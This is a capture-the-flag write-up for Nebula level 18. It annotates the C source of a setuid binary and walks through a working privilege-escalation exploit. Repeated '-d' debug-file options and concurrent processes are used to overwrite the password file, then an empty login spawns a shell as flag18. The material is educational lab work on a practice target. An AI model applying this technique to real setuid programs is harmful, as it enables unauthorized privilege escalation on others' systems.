## Challenge
Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.

## Solution
Once again, we have a `setuid` binary, but this time we also have a `password` file.
```console
level18@nebula:/home/flag18$ ls -la
total 22
drwxr-x--- 1 flag18 level18    60 2021-08-29 05:10 .
drwxr-xr-x 1 root   root       80 2012-08-27 07:18 ..
-rw-r--r-- 1 flag18 flag18    220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag18 flag18   3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag18 level18 12216 2011-11-20 21:22 flag18
-rw------- 1 flag18 flag18     37 2011-11-20 21:22 password
-rw-r--r-- 1 flag18 flag18    675 2011-05-18 02:54 .profile
```
I went over and documented the source-code supplied in this level,
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <getopt.h>

// global struct
struct
{
    FILE *debugfile;
    int verbose;
    int loggedin;
} globals;

// macro that writes to debugfile if possible
#define dprintf(...)       \
    if (globals.debugfile) \
    fprintf(globals.debugfile, __VA_ARGS__)
// like macro above, but with extra verbosity level argument
#define dvprintf(num, ...)                           \
    if (globals.debugfile && globals.verbose >= num) \
    fprintf(globals.debugfile, __VA_ARGS__)

#define PWFILE "/home/flag18/password"

void login(char *pw)
{
    FILE *fp;

    // opens /home/flag18/password for reading
    fp = fopen(PWFILE, "r");
    // if file opened
    if (fp)
    {
        char file[64];

        // reads 63 bytes from /home/flag18/password to file buffer
        if (fgets(file, sizeof(file) - 1, fp) == NULL)
        {
            dprintf("Unable to read password file %s\n", PWFILE);
            return;
        }
        // closes /home/flag18/password
        fclose(fp);
        // compare argument pw and 64 bytes long file till a null byte (at most 64 bytes)
        if (strcmp(pw, file) != 0)
            // return if not equal
            return;
    }
    dprintf("logged in successfully (with%s password file)\n",
            fp == NULL ? "out" : "");

    // sets loggedin global to 1
    globals.loggedin = 1;
}

// allocates and writes to buffer, even frees it, but does not use it!
void notsupported(char *what)
{
    // sets char pointer to NULL
    char *buffer = NULL;
    // allocates buffer and prints to it
    asprintf(&buffer, "--> [%s] is unsupported at this current time.\n", what);
    // writes arg what to debug log
    // NOTE: write-what-where vuln primitive, we can write our input to debugfile
    dprintf(what);
    // frees buffer
    free(buffer);
}

void setuser(char *user)
{
    // prints 'not supported' message, does nothing else
    char msg[128];

    sprintf(msg, "unable to set user to '%s' -- not supported.\n", user);
    printf("%s\n", msg);
}

int main(int argc, char **argv, char **envp)
{
    char c;

    // parse optional argument flags (d - debugging, v - verbose)
    while ((c = getopt(argc, argv, "d:v")) != -1)
    {
        switch (c)
        {
        case 'd':
            // open passed filename (-d optarg) for reading and writing to global debugfile
            // NOTE: another primitive for our write-what-where, we can open any file as debugfile
            globals.debugfile = fopen(optarg, "w+");
            if (globals.debugfile == NULL)
                err(1, "Unable to open %s", optarg);
            // set file stream to unbuffered - write information to the file as soon as possible
            setvbuf(globals.debugfile, NULL, _IONBF, 0);
            break;
        case 'v':
            // increment verbosity global for each -v
            globals.verbose++;
            break;
        }
    }

    dprintf("Starting up. Verbose level = %d\n", globals.verbose);

    setresgid(getegid(), getegid(), getegid());
    setresuid(geteuid(), geteuid(), geteuid());

    // infinite loop
    while (1)
    {
        char line[256];
        char *p, *q;

        // read 255 bytes from stdin to line, set q pointer to line
        q = fgets(line, sizeof(line) - 1, stdin);
        if (q == NULL)
            break;
        // find and replace the first \n and \r with null bytes
        p = strchr(line, '\n');
        if (p)
            *p = 0;
        p = strchr(line, '\r');
        if (p)
            *p = 0;

        dvprintf(2, "got [%s] as input\n", line);

        // "login" - calls login() with args, line="login {args}"
        if (strncmp(line, "login", 5) == 0)
        {
            dvprintf(3, "attempting to login\n");
            login(line + 6);
        }
        // "logout" - sets global loggedin to 0
        else if (strncmp(line, "logout", 6) == 0)
        {
            globals.loggedin = 0;
        }
        // "shell" - executes /bin/sh if loggedin global is not 0
        else if (strncmp(line, "shell", 5) == 0)
        {
            dvprintf(3, "attempting to start shell\n");
            if (globals.loggedin)
            {
                // executes a shell with the arguments given to the program
                // NOTE: arbitrary code execution
                execve("/bin/sh", argv, envp);
                err(1, "unable to execve");
            }
            dprintf("Permission denied\n");
        }
        // "logo" - same as "logout"
        else if (strncmp(line, "logout", 4) == 0)
        {
            globals.loggedin = 0;
        }
        // "closelog" - closes debugfile file stream and nulls global
        else if (strncmp(line, "closelog", 8) == 0)
        {
            if (globals.debugfile)
                fclose(globals.debugfile);
            globals.debugfile = NULL;
        }
        // "site exec" - calls notsupported with args, line="site exec {args}"
        else if (strncmp(line, "site exec", 9) == 0)
        {
            // as we established before, this endpoint allows writing our input to debugfile
            notsupported(line + 10);
        }
        // "setuser" - calls setuser with args, line="setuser {args}"
        else if (strncmp(line, "setuser", 7) == 0)
        {
            setuser(line + 8);
        }
    }

    return 0;
}
```
Let's test the program's basic functionality,
```console
level18@nebula:/home/flag18$ ./flag18 -d test -vvvv

```
Meanwhile (in a different view, I use `tmux` for that) run `watch` to show changes to the debug file.
```console
level18@nebula:/home/flag18$ watch --interval=1 "cat test"
```
As expected it creates and writes to the file.
```console
Every 1.0s: cat test                                                  Sun Aug 29 05:12:33 2021

Starting up. Verbose level = 4
```
Now let's try something,
```console
level18@nebula:/home/flag18$ ./flag18 -d test -vvvv
login helloworld
```
```
Every 1.0s: cat test                                                  Sun Aug 29 05:22:46 2021

Starting up. Verbose level = 4
got [login helloworld] as input
attempting to login
```
And now,
```console
level18@nebula:/home/flag18$ ./flag18 -d test -vvvv
login helloworld
shell
```
It failed because we supplied the wrong password.
```
Every 1.0s: cat test                                                  Sun Aug 29 05:23:41 2021

Starting up. Verbose level = 4
got [login helloworld] as input
attempting to login
got [shell] as input
attempting to start shell
Permission denied
```

### First Exploit
What if we set our debug log file to `/home/flag18/password`?
* pass `password` as `debugfile`
* use `site exec` to write arbitrary input to it and change the password required to login
* login with new password
* execute shell

We have a problem though,
```c
    // parse optional argument flags (d - debugging, v - verbose)
    while ((c = getopt(argc, argv, "d:v")) != -1)
    {
        switch (c)
        {
        case 'd':
            // open passed filename (-d optarg) for reading and writing to global debugfile
            // NOTE: another primitive for our write-what-where, we can open any file as debugfile
            globals.debugfile = fopen(optarg, "w+");
            if (globals.debugfile == NULL)
                err(1, "Unable to open %s", optarg);
            // set file stream to unbuffered - write information to the file as soon as possible
            setvbuf(globals.debugfile, NULL, _IONBF, 0);
            break;
        case 'v':
            // increment verbosity global for each -v
            globals.verbose++;
            break;
        }
    }

    dprintf("Starting up. Verbose level = %d\n", globals.verbose);
```
After parsing the flags, the program writes `Starting up. Verbose level = %d\n` to the debug file,
```c
        // read 255 bytes from stdin to line, set q pointer to line
        q = fgets(line, sizeof(line) - 1, stdin);
        if (q == NULL)
            break;
        // find and replace the first \n and \r with null bytes
        p = strchr(line, '\n');
        if (p)
            *p = 0;
        p = strchr(line, '\r');
        if (p)
            *p = 0;
```
That `\n` at the end of the string is a problem because the program nulls the first `\n` in our input.

But if you look closely, the program incorrectly treats the `-d` argument,
* instead of opening the debug file once, it opens it for each `-d` argument passed!
* And it uses the `w+` mode that truncates the file upon opening it.

So we can do the following,
* run `./flag18 -d password` (process 1) to overwrite password
* simultaneously run `./flag18 -d password -d test` (process 2) to truncate `\n` debug message written by first process
* return to process 1 and use `site exec newpassword` to write a new password
* run `./flag18 -c $SHELL` (process 3) to login with new password and execute a shell

Let's run the exploit manually,
```console
[PROCESS 1]
level18@nebula:/home/flag18$ ./flag18 -d password
```
```console
[PROCESS 2]
level18@nebula:/home/flag18$ ./flag18 -d password -d test
```
```console
[PROCESS 1]
site exec newpassword
```
```console
[PROCESS 3]
level18@nebula:/home/flag18$ ./flag18 -c $SHELL
./flag18: invalid option -- 'c'
login newpassword
shell
```
Didn't work, why though? Let's run the third process again, this time with debugging.
```console
level18@nebula:/home/flag18$ ./flag18 -c $SHELL -d test -vvv
./flag18: invalid option -- 'c'
login newpassword
shell
```
Very weird, the login failed.
```console
level18@nebula:/home/flag18$ cat test
Starting up. Verbose level = 3
got [login newpassword] as input
attempting to login
got [shell] as input
attempting to start shell
Permission denied
```
Let's execute the exploit again, this time with a password file we can read.
```console
[PROCESS 1]
level18@nebula:/home/flag18$ ./flag18 -d debugpassword
```
```console
[PROCESS 2]
level18@nebula:/home/flag18$ ./flag18 -d debugpassword -d test
```
```console
[PROCESS 1]
site exec newpassword
```
Looks fine,
```console
level18@nebula:/home/flag18$ cat debugpassword
newpassword
```
But we can look closer,
```console
level18@nebula:/home/flag18$ hexdump -C debugpassword
00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 6e  |...............n|
00000020  65 77 70 61 73 73 77 6f  72 64                    |ewpassword|
0000002a
```
There are 31 `NULL` bytes leading to our new password, the exact number of chars in the string `Starting up. Verbose level = 0\n` we truncated.
* even though we truncated `debugfile` in process 2,
* process 1's file position for `debugfile` is offset at 31 bytes from the start, because it wrote the string to the file,
* process 1 is not aware of the truncation that happend in process 2.

And then in `login()` we compare the password given and read from the file till a `NULL` byte.
```c
        // compare argument pw and 64 bytes long file till a null byte (at most 64 bytes)
        if (strcmp(pw, file) != 0)
            // return if not equal
            return;
```
We need to input an empty password (`NULL`) in the login endpoint to pass the compare.
```console
level18@nebula:/home/flag18$ ./flag18 -c $SHELL
./flag18: invalid option -- 'c'
login
shell
sh-4.2$ whoami
flag18
```
Congratz! Visit the appendix for a Python script automating this exploit.

### Second Exploit
WIP

## Appendix
### First Exploit Script
WIP
